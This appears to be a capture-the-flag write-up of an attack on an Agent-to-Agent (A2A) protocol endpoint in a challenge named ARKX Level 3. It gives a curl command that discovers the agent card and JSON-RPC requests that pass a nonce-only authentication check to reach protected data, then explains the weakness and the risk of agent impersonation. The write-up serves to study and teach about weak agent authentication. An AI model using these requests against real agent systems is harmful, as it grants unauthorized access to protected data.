# A2A (Agent-to-Agent) Protocol Attack

## Confirmed on ARKX Advanced Level 3 (The Archivist)

### Protocol Details
- **Transport:** HTTP POST with JSON-RPC 2.0
- **Endpoint:** `/level/3/a2a`
- **Method:** `tasks/send` (only supported method)
- **Auth:** Nonce-response challenge (two-step)
- **Agent Card:** Available at `.well-known/agent.json`

### Agent Card Discovery
```bash
curl -s 'https://target.com/level/N/a2a/.well-known/agent.json'
```

Returns JSON with:
- `name`, `description`, `url`, `version`
- `protocol`: "a2a"
- `skills`: Array of skill objects with id, name, description
- `authScheme`: type, description of the auth flow

### Attack Flow

**Step 1: Initiate authentication**
```json
POST /level/N/a2a
{
  "jsonrpc": "2.0",
  "method": "tasks/send",
  "params": {
    "id": "task-001",
    "message": {
      "role": "user",
      "parts": [{"type": "text", "text": "request_access"}]
    }
  },
  "id": 1
}
```

**Step 2: Receive nonce challenge**
Response has `status.state: "input-required"` and the nonce in the message text:
```
"Authentication required. Your challenge nonce is: 7e20950ece611e1e"
```

**Step 3: Reply with nonce**
```json
POST /level/N/a2a
{
  "jsonrpc": "2.0",
  "method": "tasks/send",
  "params": {
    "id": "task-001",  // SAME task ID
    "message": {
      "role": "user",
      "parts": [{"type": "text", "text": "nonce: 7e20950ece611e1e"}]
    }
  },
  "id": 2
}
```

**Step 4: Access granted**
Response has `status.state: "completed"` and artifacts with the protected data.

### Why It's Not Real Authentication
The nonce-response challenge proves the client can follow protocol instructions, not that it has a legitimate identity. There is no:
- Cryptographic signing of the nonce
- Identity verification of the caller
- Token exchange or session binding
- Proof of possession of a secret

Any client that can reach the endpoint and follow the protocol can authenticate.

### Real-World Implications
- A2A agents behind API gateways with no additional auth are vulnerable by default
- Multi-agent systems where agents trust each other via A2A can be exploited by impersonating any agent
- The `.well-known/agent.json` pattern leaks the full attack surface to anyone who can reach the endpoint